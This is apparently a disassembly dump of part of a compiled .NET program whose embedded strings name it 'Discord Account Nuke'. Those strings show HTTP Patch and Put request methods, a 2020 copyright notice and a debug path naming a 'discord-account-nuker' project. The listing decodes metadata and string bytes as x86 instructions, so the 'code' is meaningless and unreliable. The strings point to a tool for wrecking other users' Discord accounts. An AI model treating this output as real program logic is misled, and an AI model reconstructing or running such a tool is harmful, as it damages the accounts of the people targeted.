  4049bd:	88 1c e2             	mov    %bl,(%edx,%eiz,8)
  4049c0:	1f                   	pop    %ds
  4049c1:	25 52 ea 00 03       	and    $0x300ea52,%eax
  4049c6:	20 00                	and    %al,(%eax)
  4049c8:	01 04 20             	add    %eax,(%eax,%eiz,1)
  4049cb:	01 01                	add    %eax,(%ecx)
  4049cd:	08 05 20 01 01 11    	or     %al,0x11010120
  4049d3:	15 04 20 01 01       	adc    $0x1012004,%eax
  4049d8:	0e                   	push   %cs
  4049d9:	04 20                	add    $0x20,%al
  4049db:	01 01                	add    %eax,(%ecx)
  4049dd:	02 05 20 01 01 12    	add    0x12010120,%al
  4049e3:	4d                   	dec    %ebp
  4049e4:	05 20 01 01 12       	add    $0x12010120,%eax
  4049e9:	6d                   	insl   (%dx),%es:(%edi)
  4049ea:	06                   	push   %es
  4049eb:	20 01                	and    %al,(%ecx)
  4049ed:	01 11                	add    %edx,(%ecx)
  4049ef:	80 95 05 07 02 0e 12 	adcb   $0x12,0xe020705(%ebp)
  4049f6:	49                   	dec    %ecx
  4049f7:	05 20 02 01 0e       	add    $0xe010220,%eax
  4049fc:	0e                   	push   %cs
  4049fd:	06                   	push   %es
  4049fe:	00 01                	add    %al,(%ecx)
  404a00:	12 80 a1 0e 04 00    	adc    0x40ea1(%eax),%al
  404a06:	01 01                	add    %eax,(%ecx)
  404a08:	08 04 00             	or     %al,(%eax,%eax,1)
  404a0b:	01 01                	add    %eax,(%ecx)
  404a0d:	0e                   	push   %cs
  404a0e:	03 00                	add    (%eax),%eax
  404a10:	00 0e                	add    %cl,(%esi)
  404a12:	03 00                	add    (%eax),%eax
  404a14:	00 01                	add    %al,(%ecx)
  404a16:	05 00 00 11 80       	add    $0x80110000,%eax
  404a1b:	b1 04                	mov    $0x4,%cl
  404a1d:	07                   	pop    %es
  404a1e:	01 12                	add    %edx,(%edx)
  404a20:	14 06                	adc    $0x6,%al
  404a22:	15 11 7d 01 12       	adc    $0x12017d11,%eax
  404a27:	5d                   	pop    %ebp
  404a28:	08 00                	or     %al,(%eax)
  404a2a:	00 15 11 7d 01 13    	add    %dl,0x13017d11
  404a30:	00 07                	add    %al,(%edi)
  404a32:	30 01                	xor    %al,(%ecx)
  404a34:	01 01                	add    %eax,(%ecx)
  404a36:	10 1e                	adc    %bl,(%esi)
  404a38:	00 04 0a             	add    %al,(%edx,%ecx,1)
  404a3b:	01 12                	add    %edx,(%edx)
  404a3d:	14 08                	adc    $0x8,%al
  404a3f:	20 00                	and    %al,(%eax)
  404a41:	15 12 59 01 13       	adc    $0x13015912,%eax
  404a46:	00 04 07             	add    %al,(%edi,%eax,1)
  404a49:	01 12                	add    %edx,(%edx)
  404a4b:	18 04 0a             	sbb    %al,(%edx,%ecx,1)
  404a4e:	01 12                	add    %edx,(%edx)
  404a50:	18 1b                	sbb    %bl,(%ebx)
  404a52:	07                   	pop    %es
  404a53:	06                   	push   %es
  404a54:	12 61 12             	adc    0x12(%ecx),%ah
  404a57:	5d                   	pop    %ebp
  404a58:	15 12 59 01 0e       	adc    $0xe015912,%eax
  404a5d:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404a62:	12 1c 15 11 80 91 01 	adc    0x1918011(,%edx,1),%bl
  404a69:	12 1c 12             	adc    (%edx,%edx,1),%bl
  404a6c:	1c 05                	sbb    $0x5,%al
  404a6e:	20 00                	and    %al,(%eax)
  404a70:	12 80 b5 09 20 01    	adc    0x12009b5(%eax),%al
  404a76:	15 12 59 01 12       	adc    $0x12015912,%eax
  404a7b:	5d                   	pop    %ebp
  404a7c:	0e                   	push   %cs
  404a7d:	06                   	push   %es
  404a7e:	15 12 59 01 12       	adc    $0x12015912,%eax
  404a83:	5d                   	pop    %ebp
  404a84:	04 20                	add    $0x20,%al
  404a86:	00 13                	add    %dl,(%ebx)
  404a88:	00 04 20             	add    %al,(%eax,%eiz,1)
  404a8b:	00 12                	add    %dl,(%edx)
  404a8d:	65 07                	gs pop %es
  404a8f:	20 00                	and    %al,(%eax)
  404a91:	15 12 59 01 0e       	adc    $0xe015912,%eax
  404a96:	05 15 12 59 01       	add    $0x1591215,%eax
  404a9b:	0e                   	push   %cs
  404a9c:	06                   	push   %es
  404a9d:	10 01                	adc    %al,(%ecx)
  404a9f:	01 1e                	add    %ebx,(%esi)
  404aa1:	00 0e                	add    %cl,(%esi)
  404aa3:	09 0a                	or     %ecx,(%edx)
  404aa5:	01 15 12 80 8d 01    	add    %edx,0x18d8012
  404aab:	12 1c 07             	adc    (%edi,%eax,1),%bl
  404aae:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404ab3:	12 1c 09             	adc    (%ecx,%ecx,1),%bl
  404ab6:	20 00                	and    %al,(%eax)
  404ab8:	15 11 80 91 01       	adc    $0x1918011,%eax
  404abd:	13 00                	adc    (%eax),%eax
  404abf:	07                   	pop    %es
  404ac0:	15 11 80 91 01       	adc    $0x1918011,%eax
  404ac5:	12 1c 05 00 01 0e 1d 	adc    0x1d0e0100(,%eax,1),%bl
  404acc:	0e                   	push   %cs
  404acd:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  404ad2:	0e                   	push   %cs
  404ad3:	05 00 00 12 80       	add    $0x80120000,%eax
  404ad8:	c9                   	leave
  404ad9:	08 20                	or     %ah,(%eax)
  404adb:	03 01                	add    (%ecx),%eax
  404add:	0e                   	push   %cs
  404ade:	12 80 c9 0e 0b 20    	adc    0x200b0ec9(%eax),%al
  404ae4:	02 15 12 59 01 12    	add    0x12015912,%dl
  404aea:	5d                   	pop    %ebp
  404aeb:	0e                   	push   %cs
  404aec:	12 65 03             	adc    0x3(%ebp),%ah
  404aef:	20 00                	and    %al,(%eax)
  404af1:	02 1b                	add    (%ebx),%bl
  404af3:	07                   	pop    %es
  404af4:	06                   	push   %es
  404af5:	12 61 12             	adc    0x12(%ecx),%ah
  404af8:	5d                   	pop    %ebp
  404af9:	15 12 59 01 0e       	adc    $0xe015912,%eax
  404afe:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404b03:	12 24 15 11 80 91 01 	adc    0x1918011(,%edx,1),%ah
  404b0a:	12 24 12             	adc    (%edx,%edx,1),%ah
  404b0d:	24 09                	and    $0x9,%al
  404b0f:	0a 01                	or     (%ecx),%al
  404b11:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404b16:	12 24 07             	adc    (%edi,%eax,1),%ah
  404b19:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404b1e:	12 24 07             	adc    (%edi,%eax,1),%ah
  404b21:	15 11 80 91 01       	adc    $0x1918011,%eax
  404b26:	12 24 1c             	adc    (%esp,%ebx,1),%ah
  404b29:	07                   	pop    %es
  404b2a:	07                   	pop    %es
  404b2b:	12 61 12             	adc    0x12(%ecx),%ah
  404b2e:	5d                   	pop    %ebp
  404b2f:	15 12 59 01 0e       	adc    $0xe015912,%eax
  404b34:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404b39:	12 2c 15 11 80 91 01 	adc    0x1918011(,%edx,1),%ch
  404b40:	12 2c 12             	adc    (%edx,%edx,1),%ch
  404b43:	2c 02                	sub    $0x2,%al
  404b45:	09 0a                	or     %ecx,(%edx)
  404b47:	01 15 12 80 8d 01    	add    %edx,0x18d8012
  404b4d:	12 2c 07             	adc    (%edi,%eax,1),%ch
  404b50:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404b55:	12 2c 07             	adc    (%edi,%eax,1),%ch
  404b58:	15 11 80 91 01       	adc    $0x1918011,%eax
  404b5d:	12 2c 06             	adc    (%esi,%eax,1),%ch
  404b60:	00 03                	add    %al,(%ebx)
  404b62:	0e                   	push   %cs
  404b63:	0e                   	push   %cs
  404b64:	0e                   	push   %cs
  404b65:	0e                   	push   %cs
  404b66:	07                   	pop    %es
  404b67:	07                   	pop    %es
  404b68:	04 12                	add    $0x12,%al
  404b6a:	61                   	popa
  404b6b:	0e                   	push   %cs
  404b6c:	08 02                	or     %al,(%edx)
  404b6e:	0f 07                	sysret
  404b70:	05 08 12 5d 15       	add    $0x155d1208,%eax
  404b75:	11 71 01             	adc    %esi,0x1(%ecx)
  404b78:	12 5d 12             	adc    0x12(%ebp),%bl
  404b7b:	14 12                	adc    $0x12,%al
  404b7d:	75 09                	jne    0x404b88
  404b7f:	20 02                	and    %al,(%edx)
  404b81:	01 12                	add    %edx,(%edx)
  404b83:	80 81 12 80 d1 05 20 	addb   $0x20,0x5d18012(%ecx)
  404b8a:	01 01                	add    %eax,(%ecx)
  404b8c:	12 65 0b             	adc    0xb(%ebp),%ah
  404b8f:	20 01                	and    %al,(%ecx)
  404b91:	15 12 59 01 12       	adc    $0x12015912,%eax
  404b96:	5d                   	pop    %ebp
  404b97:	12 80 85 08 20 00    	adc    0x200885(%eax),%al
  404b9d:	15 11 71 01 13       	adc    $0x13017111,%eax
  404ba2:	00 06                	add    %al,(%esi)
  404ba4:	15 11 71 01 12       	adc    $0x12017111,%eax
  404ba9:	5d                   	pop    %ebp
  404baa:	0a 30                	or     (%eax),%dh
  404bac:	02 02                	add    (%edx),%al
  404bae:	01 10                	add    %edx,(%eax)
  404bb0:	1e                   	push   %ds
  404bb1:	00 10                	add    %dl,(%eax)
  404bb3:	1e                   	push   %ds
  404bb4:	01 0a                	add    %ecx,(%edx)
  404bb6:	0a 02                	or     (%edx),%al
  404bb8:	15 11 71 01 12       	adc    $0x12017111,%eax
  404bbd:	5d                   	pop    %ebp
  404bbe:	12 14 05 20 01 01 12 	adc    0x12010120(,%eax,1),%dl
  404bc5:	75 05                	jne    0x404bcc
  404bc7:	20 01                	and    %al,(%ecx)
  404bc9:	01 13                	add    %edx,(%ebx)
  404bcb:	00 0f                	add    %cl,(%edi)
  404bcd:	07                   	pop    %es
  404bce:	05 08 12 5d 15       	add    $0x155d1208,%eax
  404bd3:	11 71 01             	adc    %esi,0x1(%ecx)
  404bd6:	12 5d 12             	adc    0x12(%ebp),%bl
  404bd9:	18 12                	sbb    %dl,(%edx)
  404bdb:	75 0a                	jne    0x404be7
  404bdd:	0a 02                	or     (%edx),%al
  404bdf:	15 11 71 01 12       	adc    $0x12017111,%eax
  404be4:	5d                   	pop    %ebp
  404be5:	12 18                	adc    (%eax),%bl
  404be7:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  404bed:	34 e0                	xor    $0xe0,%al
  404bef:	89 08                	mov    %ecx,(%eax)
  404bf1:	b0 3f                	mov    $0x3f,%al
  404bf3:	5f                   	pop    %edi
  404bf4:	7f 11                	jg     0x404c07
  404bf6:	d5 0a                	aad    $0xa
  404bf8:	3a 08                	cmp    (%eax),%cl
  404bfa:	30 ad 4f e6 b2 a6    	xor    %ch,-0x594d19b1(%ebp)
  404c00:	ae                   	scas   %es:(%edi),%al
  404c01:	ed                   	in     (%dx),%eax
  404c02:	02 06                	add    (%esi),%al
  404c04:	08 07                	or     %al,(%edi)
  404c06:	06                   	push   %es
  404c07:	15 11 7d 01 12       	adc    $0x12017d11,%eax
  404c0c:	5d                   	pop    %ebp
  404c0d:	03 06                	add    (%esi),%eax
  404c0f:	12 61 02             	adc    0x2(%ecx),%ah
  404c12:	06                   	push   %es
  404c13:	0e                   	push   %cs
  404c14:	03 06                	add    (%esi),%eax
  404c16:	12 65 04             	adc    0x4(%ebp),%ah
  404c19:	06                   	push   %es
  404c1a:	12 80 81 04 06 12    	adc    0x12060481(%eax),%al
  404c20:	80 85 03 06 12 5d 07 	addb   $0x7,0x5d120603(%ebp)
  404c27:	06                   	push   %es
  404c28:	15 11 71 01 12       	adc    $0x12017111,%eax
  404c2d:	5d                   	pop    %ebp
  404c2e:	02 06                	add    (%esi),%al
  404c30:	1c 03                	sbb    $0x3,%al
  404c32:	06                   	push   %es
  404c33:	12 1c 08             	adc    (%eax,%ecx,1),%bl
  404c36:	06                   	push   %es
  404c37:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404c3c:	12 24 02             	adc    (%edx,%eax,1),%ah
  404c3f:	06                   	push   %es
  404c40:	02 07                	add    (%edi),%al
  404c42:	06                   	push   %es
  404c43:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404c48:	0e                   	push   %cs
  404c49:	08 06                	or     %al,(%esi)
  404c4b:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404c50:	12 20                	adc    (%eax),%ah
  404c52:	05 00 01 01 1d       	add    $0x1d010100,%eax
  404c57:	0e                   	push   %cs
  404c58:	0d 00 03 15 12       	or     $0x12150300,%eax
  404c5d:	59                   	pop    %ecx
  404c5e:	01 12                	add    %edx,(%edx)
  404c60:	5d                   	pop    %ebp
  404c61:	12 61 0e             	adc    0xe(%ecx),%ah
  404c64:	12 65 03             	adc    0x3(%ebp),%ah
  404c67:	20 00                	and    %al,(%eax)
  404c69:	0e                   	push   %cs
  404c6a:	03 20                	add    (%eax),%esp
  404c6c:	00 08                	add    %cl,(%eax)
  404c6e:	03 20                	add    (%eax),%esp
  404c70:	00 1c 04             	add    %bl,(%esp,%eax,1)
  404c73:	20 01                	and    %al,(%ecx)
  404c75:	01 1c 04             	add    %ebx,(%esp,%eax,1)
  404c78:	20 00                	and    %al,(%eax)
  404c7a:	12 1c 05 20 01 01 12 	adc    0x12010120(,%eax,1),%bl
  404c81:	1c 09                	sbb    $0x9,%al
  404c83:	20 00                	and    %al,(%eax)
  404c85:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404c8a:	12 24 0a             	adc    (%edx,%ecx,1),%ah
  404c8d:	20 01                	and    %al,(%ecx)
  404c8f:	01 15 12 80 8d 01    	add    %edx,0x18d8012
  404c95:	12 24 08             	adc    (%eax,%ecx,1),%ah
  404c98:	20 00                	and    %al,(%eax)
  404c9a:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404c9f:	0e                   	push   %cs
  404ca0:	09 20                	or     %esp,(%eax)
  404ca2:	01 01                	add    %eax,(%ecx)
  404ca4:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404ca9:	0e                   	push   %cs
  404caa:	09 20                	or     %esp,(%eax)
  404cac:	00 15 12 80 8d 01    	add    %dl,0x18d8012
  404cb2:	12 20                	adc    (%eax),%ah
  404cb4:	0a 20                	or     (%eax),%ah
  404cb6:	01 01                	add    %eax,(%ecx)
  404cb8:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404cbd:	12 20                	adc    (%eax),%ah
  404cbf:	03 28                	add    (%eax),%ebp
  404cc1:	00 0e                	add    %cl,(%esi)
  404cc3:	03 28                	add    (%eax),%ebp
  404cc5:	00 08                	add    %cl,(%eax)
  404cc7:	03 28                	add    (%eax),%ebp
  404cc9:	00 1c 04             	add    %bl,(%esp,%eax,1)
  404ccc:	28 00                	sub    %al,(%eax)
  404cce:	12 1c 09             	adc    (%ecx,%ecx,1),%bl
  404cd1:	28 00                	sub    %al,(%eax)
  404cd3:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404cd8:	12 24 03             	adc    (%ebx,%eax,1),%ah
  404cdb:	28 00                	sub    %al,(%eax)
  404cdd:	02 08                	add    (%eax),%cl
  404cdf:	28 00                	sub    %al,(%eax)
  404ce1:	15 12 80 8d 01       	adc    $0x18d8012,%eax
  404ce6:	0e                   	push   %cs
  404ce7:	09 28                	or     %ebp,(%eax)
  404ce9:	00 15 12 80 8d 01    	add    %dl,0x18d8012
  404cef:	12 20                	adc    (%eax),%ah
  404cf1:	04 01                	add    $0x1,%al
  404cf3:	00 00                	add    %al,(%eax)
  404cf5:	00 08                	add    %cl,(%eax)
  404cf7:	01 00                	add    %eax,(%eax)
  404cf9:	08 00                	or     %al,(%eax)
  404cfb:	00 00                	add    %al,(%eax)
  404cfd:	00 00                	add    %al,(%eax)
  404cff:	1e                   	push   %ds
  404d00:	01 00                	add    %eax,(%eax)
  404d02:	01 00                	add    %eax,(%eax)
  404d04:	54                   	push   %esp
  404d05:	02 16                	add    (%esi),%dl
  404d07:	57                   	push   %edi
  404d08:	72 61                	jb     0x404d6b
  404d0a:	70 4e                	jo     0x404d5a
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	6e                   	outsb  %ds:(%esi),(%dx)
  404d0e:	45                   	inc    %ebp
  404d0f:	78 63                	js     0x404d74
  404d11:	65 70 74             	gs jo  0x404d88
  404d14:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  404d1b:	77 73                	ja     0x404d90
  404d1d:	01 08                	add    %ecx,(%eax)
  404d1f:	01 00                	add    %eax,(%eax)
  404d21:	07                   	pop    %es
  404d22:	01 00                	add    %eax,(%eax)
  404d24:	00 00                	add    %al,(%eax)
  404d26:	00 18                	add    %bl,(%eax)
  404d28:	01 00                	add    %eax,(%eax)
  404d2a:	13 44 69 73          	adc    0x73(%ecx,%ebp,2),%eax
  404d2e:	63 6f 72             	arpl   %ebp,0x72(%edi)
  404d31:	64 20 41 63          	and    %al,%fs:0x63(%ecx)
  404d35:	63 6f 75             	arpl   %ebp,0x75(%edi)
  404d38:	74 20                	je     0x404d5a
  404d3a:	4e                   	dec    %esi
  404d3b:	75 6b                	jne    0x404da8
  404d3d:	65 00 00             	add    %al,%gs:(%eax)
  404d40:	05 01 00 00 00       	add    $0x1,%eax
  404d45:	00 17                	add    %dl,(%edi)
  404d47:	01 00                	add    %eax,(%eax)
  404d49:	12 43 6f             	adc    0x6f(%ebx),%al
  404d4c:	70 79                	jo     0x404dc7
  404d4e:	72 69                	jb     0x404db9
  404d50:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  404d56:	20 20                	and    %ah,(%eax)
  404d58:	32 30                	xor    (%eax),%dh
  404d5a:	32 30                	xor    (%eax),%dh
  404d5c:	00 00                	add    %al,(%eax)
  404d5e:	29 01                	sub    %eax,(%ecx)
  404d60:	00 24 64             	add    %ah,(%esp,%eiz,2)
  404d63:	66 33 30             	xor    (%eax),%si
  404d66:	39 38                	cmp    %edi,(%eax)
  404d68:	31 39                	xor    %edi,(%ecx)
  404d6a:	2d 37 35 39 31       	sub    $0x31393537,%eax
  404d6f:	2d 34 34 38 66       	sub    $0x66383434,%eax
  404d74:	2d 62 64 39 63       	sub    $0x63396462,%eax
  404d79:	2d 36 33 63 30       	sub    $0x30633336,%eax
  404d7e:	36 63 39             	arpl   %edi,%ss:(%ecx)
  404d81:	33 62 65             	xor    0x65(%edx),%esp
  404d84:	65 34 00             	gs xor $0x0,%al
  404d87:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  404d8a:	00 07                	add    %al,(%edi)
  404d8c:	31 2e                	xor    %ebp,(%esi)
  404d8e:	30 2e                	xor    %ch,(%esi)
  404d90:	30 2e                	xor    %ch,(%esi)
  404d92:	30 00                	xor    %al,(%eax)
  404d94:	00 4d 01             	add    %cl,0x1(%ebp)
  404d97:	00 1c 2e             	add    %bl,(%esi,%ebp,1)
  404d9a:	4e                   	dec    %esi
  404d9b:	45                   	inc    %ebp
  404d9c:	54                   	push   %esp
  404d9d:	46                   	inc    %esi
  404d9e:	72 61                	jb     0x404e01
  404da0:	6d                   	insl   (%dx),%es:(%edi)
  404da1:	65 77 6f             	gs ja  0x404e13
  404da4:	72 6b                	jb     0x404e11
  404da6:	2c 56                	sub    $0x56,%al
  404da8:	65 72 73             	gs jb  0x404e1e
  404dab:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  404db2:	37                   	aaa
  404db3:	2e 32 01             	xor    %cs:(%ecx),%al
  404db6:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  404dba:	46                   	inc    %esi
  404dbb:	72 61                	jb     0x404e1e
  404dbd:	6d                   	insl   (%dx),%es:(%edi)
  404dbe:	65 77 6f             	gs ja  0x404e30
  404dc1:	72 6b                	jb     0x404e2e
  404dc3:	44                   	inc    %esp
  404dc4:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  404dcb:	61                   	popa
  404dcc:	6d                   	insl   (%dx),%es:(%edi)
  404dcd:	65 14 2e             	gs adc $0x2e,%al
  404dd0:	4e                   	dec    %esi
  404dd1:	45                   	inc    %ebp
  404dd2:	54                   	push   %esp
  404dd3:	20 46 72             	and    %al,0x72(%esi)
  404dd6:	61                   	popa
  404dd7:	6d                   	insl   (%dx),%es:(%edi)
  404dd8:	65 77 6f             	gs ja  0x404e4a
  404ddb:	72 6b                	jb     0x404e48
  404ddd:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  404de0:	37                   	aaa
  404de1:	2e 32 32             	xor    %cs:(%edx),%dh
  404de4:	01 00                	add    %eax,(%eax)
  404de6:	2d 44 69 73 63       	sub    $0x63736944,%eax
  404deb:	6f                   	outsl  %ds:(%esi),(%dx)
  404dec:	72 64                	jb     0x404e52
  404dee:	5f                   	pop    %edi
  404def:	41                   	inc    %ecx
  404df0:	63 63 6f             	arpl   %esp,0x6f(%ebx)
  404df3:	75 74                	jne    0x404e69
  404df5:	5f                   	pop    %edi
  404df6:	4e                   	dec    %esi
  404df7:	75 6b                	jne    0x404e64
  404df9:	65 73 2e             	gs jae 0x404e2a
  404dfc:	48                   	dec    %eax
  404dfd:	54                   	push   %esp
  404dfe:	54                   	push   %esp
  404dff:	50                   	push   %eax
  404e00:	4e                   	dec    %esi
  404e01:	65 77 2b             	gs ja  0x404e2f
  404e04:	3c 50                	cmp    $0x50,%al
  404e06:	61                   	popa
  404e07:	74 63                	je     0x404e6c
  404e09:	68 41 73 79 6e       	push   $0x6e797341
  404e0e:	63 3e                	arpl   %edi,(%esi)
  404e10:	64 5f                	fs pop %edi
  404e12:	5f                   	pop    %edi
  404e13:	30 00                	xor    %al,(%eax)
  404e15:	00 30                	add    %dh,(%eax)
  404e17:	01 00                	add    %eax,(%eax)
  404e19:	2b 44 69 73          	sub    0x73(%ecx,%ebp,2),%eax
  404e1d:	63 6f 72             	arpl   %ebp,0x72(%edi)
  404e20:	64 5f                	fs pop %edi
  404e22:	41                   	inc    %ecx
  404e23:	63 63 6f             	arpl   %esp,0x6f(%ebx)
  404e26:	75 74                	jne    0x404e9c
  404e28:	5f                   	pop    %edi
  404e29:	4e                   	dec    %esi
  404e2a:	75 6b                	jne    0x404e97
  404e2c:	65 73 2e             	gs jae 0x404e5d
  404e2f:	48                   	dec    %eax
  404e30:	54                   	push   %esp
  404e31:	54                   	push   %esp
  404e32:	50                   	push   %eax
  404e33:	4e                   	dec    %esi
  404e34:	65 77 2b             	gs ja  0x404e62
  404e37:	3c 50                	cmp    $0x50,%al
  404e39:	75 74                	jne    0x404eaf
  404e3b:	41                   	inc    %ecx
  404e3c:	73 79                	jae    0x404eb7
  404e3e:	6e                   	outsb  %ds:(%esi),(%dx)
  404e3f:	63 3e                	arpl   %edi,(%esi)
  404e41:	64 5f                	fs pop %edi
  404e43:	5f                   	pop    %edi
  404e44:	31 00                	xor    %eax,(%eax)
  404e46:	00 08                	add    %cl,(%eax)
  404e48:	01 00                	add    %eax,(%eax)
	...
  404e52:	00 00                	add    %al,(%eax)
  404e54:	e0 5a                	loopne 0x404eb0
  404e56:	51                   	push   %ecx
  404e57:	a2 00 00 00 00       	mov    %al,0x0
  404e5c:	02 00                	add    (%eax),%al
  404e5e:	00 00                	add    %al,(%eax)
  404e60:	88 00                	mov    %al,(%eax)
  404e62:	00 00                	add    %al,(%eax)
  404e64:	88 4e 00             	mov    %cl,0x0(%esi)
  404e67:	00 88 30 00 00 00    	add    %cl,0x30(%eax)
	...
  404e75:	00 00                	add    %al,(%eax)
  404e77:	00 10                	add    %dl,(%eax)
	...
  404e85:	00 00                	add    %al,(%eax)
  404e87:	00 52 53             	add    %dl,0x53(%edx)
  404e8a:	44                   	inc    %esp
  404e8b:	53                   	push   %ebx
  404e8c:	71 3d                	jno    0x404ecb
  404e8e:	34 cb                	xor    $0xcb,%al
  404e90:	30 a6 53 44 a3 5f    	xor    %ah,0x5fa34453(%esi)
  404e96:	c4 0b                	les    (%ebx),%ecx
  404e98:	be 42 2c 83 01       	mov    $0x1832c42,%esi
  404e9d:	00 00                	add    %al,(%eax)
  404e9f:	00 43 3a             	add    %al,0x3a(%ebx)
  404ea2:	5c                   	pop    %esp
  404ea3:	55                   	push   %ebp
  404ea4:	73 65                	jae    0x404f0b
  404ea6:	72 73                	jb     0x404f1b
  404ea8:	5c                   	pop    %esp
  404ea9:	52                   	push   %edx
  404eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  404eab:	6f                   	outsl  %ds:(%esi),(%dx)
  404eac:	6b 69 65 54          	imul   $0x54,0x65(%ecx),%ebp
  404eb0:	68 61 47 61 77       	push   $0x77614761
  404eb5:	64 5c                	fs pop %esp
  404eb7:	44                   	inc    %esp
  404eb8:	65 73 6b             	gs jae 0x404f26
  404ebb:	74 6f                	je     0x404f2c
  404ebd:	70 5c                	jo     0x404f1b
  404ebf:	64 69 73 63 6f 72 64 	imul   $0x2d64726f,%fs:0x63(%ebx),%esi
  404ec6:	2d 
  404ec7:	61                   	popa
  404ec8:	63 63 6f             	arpl   %esp,0x6f(%ebx)
  404ecb:	75 6e                	jne    0x404f3b
  404ecd:	74 2d                	je     0x404efc
  404ecf:	6e                   	outsb  %ds:(%esi),(%dx)
  404ed0:	75 6b                	jne    0x404f3d
  404ed2:	65 72 2d             	gs jb  0x404f02
  404ed5:	6d                   	insl   (%dx),%es:(%edi)
  404ed6:	61                   	popa
  404ed7:	69 6e 5c 44 69 73 63 	imul   $0x63736944,0x5c(%esi),%ebp
  404ede:	6f                   	outsl  %ds:(%esi),(%dx)
  404edf:	72 64                	jb     0x404f45
  404ee1:	20 41 63             	and    %al,0x63(%ecx)
  404ee4:	63 6f 75             	arpl   %ebp,0x75(%edi)
  404ee7:	74 20                	je     0x404f09
  404ee9:	4e                   	dec    %esi
  404eea:	75 6b                	jne    0x404f57
  404eec:	65 5c                	gs pop %esp
  404eee:	6f                   	outsl  %ds:(%esi),(%dx)
  404eef:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  404ef2:	44                   	inc    %esp
  404ef3:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  404ef7:	5c                   	pop    %esp
  404ef8:	44                   	inc    %esp
  404ef9:	69 73 63 6f 72 64 20 	imul   $0x2064726f,0x63(%ebx),%esi
  404f00:	41                   	inc    %ecx
  404f01:	63 63 6f             	arpl   %esp,0x6f(%ebx)
  404f04:	75 74                	jne    0x404f7a
  404f06:	20 4e 75             	and    %cl,0x75(%esi)
  404f09:	6b 65 2e 70          	imul   $0x70,0x2e(%ebp),%esp
  404f0d:	64 62 00             	bound  %eax,%fs:(%eax)
  404f10:	38 4f 00             	cmp    %cl,0x0(%edi)
	...
  404f1b:	00 52 4f             	add    %dl,0x4f(%edx)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 20                	add    %ah,(%eax)
	...
  404f36:	00 00                	add    %al,(%eax)
  404f38:	44                   	inc    %esp
  404f39:	4f                   	dec    %edi
	...
  404f46:	5f                   	pop    %edi
  404f47:	43                   	inc    %ebx
  404f48:	6f                   	outsl  %ds:(%esi),(%dx)
  404f49:	72 45                	jb     0x404f90
  404f4b:	78 65                	js     0x404fb2
  404f4d:	4d                   	dec    %ebp
  404f4e:	61                   	popa
  404f4f:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  404f56:	72 65                	jb     0x404fbd
  404f58:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  404f5c:	6c                   	insb   (%dx),%es:(%edi)
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 00                	add    %al,(%eax)
  404f61:	00 ff                	add    %bh,%bh
  404f63:	25 00 20 40 00       	and    $0x402000,%eax
